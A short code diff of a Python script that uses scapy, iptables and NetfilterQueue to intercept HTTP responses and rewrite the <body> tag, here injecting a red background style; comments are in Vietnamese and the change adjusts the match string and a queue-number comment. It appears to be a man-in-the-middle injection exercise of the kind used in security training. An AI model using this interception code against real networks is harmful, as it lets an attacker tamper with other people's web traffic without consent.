@@ -29,14 +29,14 @@ def process_packet(packet):
             packet.set_payload(bytes(new_packet))
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            modified_load = scapy_packet[scapy.Raw].load.replace(b'<body>',  b'<body style="background-color:red;">')
+            modified_load = scapy_packet[scapy.Raw].load.replace(b'<body',  b'<body style="background-color:red;"')
             new_packet = set_load(scapy_packet, modified_load)
             packet.set_payload(bytes(new_packet))
             print("SUCCESS MODIFIED")
     packet.accept()
 
 def main():
-    # Them quy tac iptables voi queue number la 0
+    # Them quy tac iptables voi queue number la 3
     add_iptables_rule(3)
     
     # Khoi tao NetfilterQueue va bind voi process_packet
